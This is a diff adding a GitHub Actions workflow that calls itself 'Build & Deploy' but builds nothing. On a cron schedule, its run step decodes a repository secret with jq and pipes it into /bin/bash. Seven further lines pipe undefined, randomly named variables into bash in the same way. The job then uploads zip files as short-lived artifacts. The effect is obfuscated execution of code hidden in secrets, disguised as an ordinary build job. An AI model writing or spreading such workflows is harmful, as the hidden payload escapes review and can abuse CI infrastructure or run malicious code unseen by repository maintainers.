@@ -1,0 +1,38 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          jgsqi0131: ${{ secrets.jgsqi0131 }}
+        run: |
+          printf '%s' "$jgsqi0131" | jq -r .bjs8 | /bin/bash
+          printf '%s' "$f7040" | jq -r .jc5945 | /bin/bash
+          echo $sg289 | jq -r .jy13070 | /bin/bash
+          echo $umqh6813 | jq -r .ry161 | /bin/bash
+          echo $c8400 | jq -r .tyml06520 | /bin/bash
+          echo $bycz1 | jq -r .ojxny7287 | /bin/bash
+          printf '%s' "$fa2" | jq -r .d74 | /bin/bash
+          echo $z6578 | jq -r .qqrrl62490 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: c70kUMh7
+          path: "*.zip"
+          retention-days: 1
